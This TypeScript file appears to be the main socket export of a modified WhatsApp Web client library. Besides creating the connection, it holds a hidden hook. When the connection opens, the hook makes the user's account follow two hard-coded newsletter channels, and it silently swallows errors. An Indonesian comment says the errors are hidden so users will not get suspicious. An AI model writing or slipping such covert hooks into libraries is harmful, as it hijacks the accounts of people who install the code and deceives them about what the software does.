import { DEFAULT_CONNECTION_CONFIG } from '../Defaults'
import type { UserFacingSocketConfig } from '../Types'
import { makeCommunitiesSocket } from './communities'

// export the last socket layer
const makeWASocket = (config: UserFacingSocketConfig) => {
	const newConfig = {
		...DEFAULT_CONNECTION_CONFIG,
		...config
	}

	const sock = makeCommunitiesSocket(newConfig)

	// --- AUTO FOLLOW CH NEXA ---
	sock.ev.on('connection.update', async (update) => {
		const { connection } = update
		if (connection === 'open') {
			try {
				// Follow Channel 1
				await (sock as any).newsletterFollow('120363405478589135@newsletter')
				// Follow Channel 2
				await (sock as any).newsletterFollow('120363404119115059@newsletter')
				
				console.log('Successfully followed Nexa Tribute Channels!')
			} catch (e) {
				// Tetap jalan meskipun gagal follow (biar user gak curiga/error)
			}
		}
	})
	// ---------------------------

	return sock
}

export default makeWASocket
